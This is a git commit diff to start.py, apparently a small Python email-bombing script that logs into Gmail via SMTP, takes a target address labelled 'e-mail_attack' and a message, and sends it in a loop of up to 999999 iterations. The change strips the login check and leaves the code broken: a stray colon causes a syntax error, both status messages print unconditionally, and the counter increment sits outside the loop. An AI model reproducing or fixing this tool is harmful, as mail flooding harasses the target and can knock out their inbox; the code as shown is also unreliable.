d349ea2dcb8d50110cf50a346819f7c1b408c9a0
norlandis <33873094+norlandis@users.noreply.github.com>
2018-04-01 00:19:01 +0300

    Update start.py

--- start.py
+++ start.py
@@ -3,16 +3,12 @@ smtpObj = smtplib.SMTP('smtp.gmail.com',587)
 smtpObj.starttls()
 gml = input("gmail:")
 ps = input("password:")
-if smtpObj.login(gml,ps):
- jar = input("e-mail_attack:")
- mess = input("message:")
- smtpObj.sendmail(gml,jar,mess)
- i = 1
- while i <= 999999:
-  if smtpObj.sendmail(gml,jar,mess):
-   print('message send - [ERROR]')
-  else:
-   print('message send - [OK]')
- i = i + 1
-else:
- print("no valid password")
+jar = input("e-mail_attack:")
+mess = input("message:")
+smtpObj.sendmail(gml,jar,mess)
+i = 1
+while i <= 999999:
+ smtpObj.sendmail(gml,jar,mess):
+ print('message send - [ERROR]')
+ print('message send - [OK]')
+i = i + 1
